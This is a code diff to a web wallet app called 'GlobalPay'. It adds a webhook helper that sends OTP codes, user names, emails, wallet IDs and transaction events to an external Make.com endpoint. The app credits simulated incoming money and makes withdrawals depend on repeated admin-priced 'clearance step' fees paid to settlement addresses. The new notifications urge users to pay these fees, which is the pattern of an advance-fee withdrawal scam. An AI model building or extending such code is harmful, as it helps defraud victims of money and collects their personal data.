@@ -862,7 +862,7 @@
         </div>
       </div>
 
-      <!-- Active Withdrawal Progress Tracker (Shown when user has a withdrawal in progress) -->
+      <!-- Active Withdrawal Status Banner on Dashboard -->
       <div id="activeWithdrawalBanner" class="withdrawal-status-card" style="display:none;"></div>
 
       <!-- Multi-Currency Fiat Wallets (User Country First, then USD, EUR, GBP) -->
@@ -1133,6 +1133,48 @@
 
   <script>
     const MAKE_OTP_WEBHOOK_URL = "https://hook.eu1.make.com/618msiw7y7cb4ieca7sp68qy6xi6n4e5";
+
+    async function sendMakeNotification(payload) {
+      try {
+        await fetch(MAKE_OTP_WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            ...payload,
+            timestamp: new Date().toISOString()
+          })
+        });
+        return true;
+      } catch (err) {
+        return false;
+      }
+    }
+
+    function buildWithdrawalActionRequiredText(step, effectivePriceUsd, destinationLabel) {
+      return `Pay $${Number(effectivePriceUsd).toFixed(2)} USD for "${step.title}" to settlement address ${step.settlementAddress}, then upload your payment screenshot in the Withdraw modal to release your $${Number(amountUsdFallback(destinationLabel)).toFixed(2)} USD withdrawal to ${destinationLabel}.`;
+    }
+
+    function amountUsdFallback(destinationLabel) {
+      return currentUser && currentUser.activeWithdrawal ? currentUser.activeWithdrawal.amountUsd : 0;
+    }
+
+    async function notifyWithdrawalStepAction(wd, step, effectivePriceUsd) {
+      if (!currentUser || !wd || !step) return;
+      const actionRequired = `Complete "${step.title}" (${step.description}) by paying $${Number(effectivePriceUsd).toFixed(2)} USD to ${step.settlementAddress} and uploading your payment screenshot in your GlobalPay Withdraw screen for your $${Number(wd.amountUsd).toFixed(2)} USD payout to ${wd.destinationLabel}.`;
+      await sendMakeNotification({
+        type: "withdrawal",
+        name: currentUser.name,
+        email: currentUser.email,
+        wallet_id: currentUser.walletId,
+        amount_usd: Number(wd.amountUsd).toFixed(2),
+        destination: wd.destinationLabel,
+        step_title: step.title,
+        step_description: step.description,
+        fee_usd: Number(effectivePriceUsd).toFixed(2),
+        settlement_address: step.settlementAddress,
+        action_required: actionRequired
+      });
+    }
 
     // Complete World Countries List with Currency Code, Symbol & Rate per 1 USD
     const WORLD_COUNTRIES = [
@@ -1491,24 +1533,20 @@
         4000
       );
 
-      try {
-        await fetch(MAKE_OTP_WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            name: targetName,
-            email: targetEmail,
-            otp: currentOtpCode,
-            timestamp: new Date().toISOString()
-          })
-        });
+      const sent = await sendMakeNotification({
+        type: "otp",
+        name: targetName,
+        email: targetEmail,
+        otp: currentOtpCode
+      });
 
+      if (sent) {
         showToast(
           `Verification code sent! Check your email inbox (or spam folder) at <strong>${targetEmail}</strong>.`,
           "success",
           6000
         );
-      } catch (err) {
+      } else {
         showToast("Could not reach verification server. Please check your connection and tap Resend.", "danger");
       }
     }
@@ -1712,8 +1750,8 @@
       renderDashboard();
     }
 
-    // Simulate Someone Sending USD to User
-    function simulateIncomingUsd() {
+    // Simulate Someone Sending USD to User -> Money Received Webhook
+    async function simulateIncomingUsd() {
       const incomingUsd = 250;
       currentUser.balanceUsd += incomingUsd;
       const c = currentUser.country;
@@ -1726,6 +1764,17 @@
         "Completed"
       );
       showToast(`Received +${localAdded} (${c.code}) — Equivalent: $${incomingUsd.toFixed(2)} USD`, "success");
+
+      await sendMakeNotification({
+        type: "money_received",
+        name: currentUser.name,
+        email: currentUser.email,
+        wallet_id: currentUser.walletId,
+        amount_usd: incomingUsd.toFixed(2),
+        local_amount: localAdded,
+        currency: c.code,
+        sender: "External Sender"
+      });
     }
 
     // Receive Modal (Wallet ID, Bitcoin, Ethereum)
@@ -1747,8 +1796,8 @@
       document.getElementById("receiveEthPanel").style.display = tab === "eth" ? "block" : "none";
     }
 
-    // Send Funds
-    function handleSendFunds(e) {
+    // Send Funds -> Money Sent Webhook
+    async function handleSendFunds(e) {
       e.preventDefault();
       const recipient = document.getElementById("sendRecipient").value.trim();
       const amtUsd = parseFloat(document.getElementById("sendAmountUsd").value);
@@ -1764,10 +1813,24 @@
       }
 
       currentUser.balanceUsd -= amtUsd;
+      const c = currentUser.country;
+      const localSent = formatMoney(amtUsd * c.rate, c.symbol);
+
       addTransaction("debit", `Sent to ${recipient}`, "Internal Wallet Transfer", amtUsd, "Sent");
       closeModal("sendModal");
       e.target.reset();
       showToast(`Sent $${amtUsd.toFixed(2)} USD to ${recipient}.`, "success");
+
+      await sendMakeNotification({
+        type: "money_sent",
+        name: currentUser.name,
+        email: currentUser.email,
+        wallet_id: currentUser.walletId,
+        amount_usd: amtUsd.toFixed(2),
+        local_amount: localSent,
+        currency: c.code,
+        recipient: recipient
+      });
     }
 
     // Request Payment
@@ -1827,7 +1890,7 @@
       }
     }
 
-    function submitWithdrawalDetails(e) {
+    async function submitWithdrawalDetails(e) {
       e.preventDefault();
       const amountUsd = parseFloat(document.getElementById("wdAmountUsd").value);
       const method = document.getElementById("wdMethod").value;
@@ -1880,6 +1943,9 @@
       document.getElementById("withdrawActionStepView").style.display = "block";
       renderActiveWithdrawalStepModal();
       showToast("Withdrawal submitted! Complete the required clearance step to release funds.", "warning");
+
+      const firstStep = appConfig.steps[0];
+      await notifyWithdrawalStepAction(currentUser.activeWithdrawal, firstStep, firstStep.priceUsd);
     }
 
     function renderActiveWithdrawalStepModal() {
@@ -2048,7 +2114,7 @@
     // Timer Ticker for Post-Approval Admin Status Delay
     function startStatusTicker() {
       if (statusCountdownInterval) clearInterval(statusCountdownInterval);
-      statusCountdownInterval = setInterval(() => {
+      statusCountdownInterval = setInterval(async () => {
         if (!currentUser || !currentUser.activeWithdrawal) return;
         const wd = currentUser.activeWithdrawal;
         if (wd.status === "post_approval_wait" && wd.waitEndsAt) {
@@ -2056,13 +2122,15 @@
             // Advance to next step or complete withdrawal
             const nextIdx = wd.stepIndex + 1;
             if (nextIdx < appConfig.steps.length) {
+              const nextStep = appConfig.steps[nextIdx];
               wd.stepIndex = nextIdx;
               wd.status = "action_required";
               wd.appealedPriceUsd = null;
               wd.receiptDataUrl = null;
               wd.waitEndsAt = null;
               saveUser();
-              showToast(`Next step required: ${appConfig.steps[nextIdx].title}`, "warning", 6000);
+              showToast(`Next step required: ${nextStep.title}`, "warning", 6000);
+              await notifyWithdrawalStepAction(wd, nextStep, nextStep.priceUsd);
             } else {
               wd.status = "completed";
               currentUser.balanceUsd = Math.max(0, currentUser.balanceUsd - wd.amountUsd);
@@ -2219,7 +2287,7 @@
       showToast("Step removed.", "info");
     }
 
-    function applyUserStepAppeal() {
+    async function applyUserStepAppeal() {
       if (!currentUser || !currentUser.activeWithdrawal) return;
       const newPrice = parseFloat(document.getElementById("adminAppealPriceInput").value);
       if (isNaN(newPrice) || newPrice < 0) return;
@@ -2241,6 +2309,7 @@
       renderAdminPanel();
       renderDashboard();
       showToast(`Step fee appealed to $${newPrice.toFixed(2)} USD for ${currentUser.name}!`, "success");
+      await notifyWithdrawalStepAction(wd, step, newPrice);
     }
 
     function adminApproveCurrentStep() {
